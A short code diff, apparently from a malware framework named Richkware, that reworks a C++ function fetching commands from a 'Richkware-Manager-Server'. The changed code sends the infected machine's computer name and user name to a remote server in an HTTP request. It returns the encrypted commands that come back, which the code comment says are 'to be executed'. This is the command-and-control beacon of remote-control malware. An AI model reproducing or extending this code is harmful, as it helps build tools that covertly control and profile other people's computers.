@@ -161,15 +161,14 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
     return false;
 }
 
-//TODO: funzione di fetch dei comandi (dovrà poter esserre chiamata dal main indipendentemente dall'upload dei dati sul server)
-std::string Network::fetchCommand(const char *serverAddress, const char *port, const char *associatedUser, std::string remainingCommands) {
+std::string Network::fetchCommand(const char *serverAddress, const char *port, std::string remainingCommands) {
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
-    std::string encAssociatedUser = crypto.Encrypt(associatedUser);
+    device.append("/");
+    device.append(getenv("USERNAME"));
 
     std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
-                         "&data1=" + encAssociatedUser +
-                         "&data2=" + remainingCommands +
+                         "&data1=" + remainingCommands +
                          " HTTP/1.1\r\n" +
                          "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
@@ -203,10 +202,7 @@ std::string Network::fetchCommand(const char *serverAddress, const char *port, c
         std::string token2;
         pos = response.find(delimiter2);
         token = response.substr(0, pos);
-        std::cout << token << std::endl;
-        response.erase(0, pos + delimiter.length());
-
-        return response;        //returns an encrypted string containing the commands to be executed
+        return token;        //returns an encrypted string containing the commands to be executed
     } else {
         //TODO: manage KO from server
         return "";
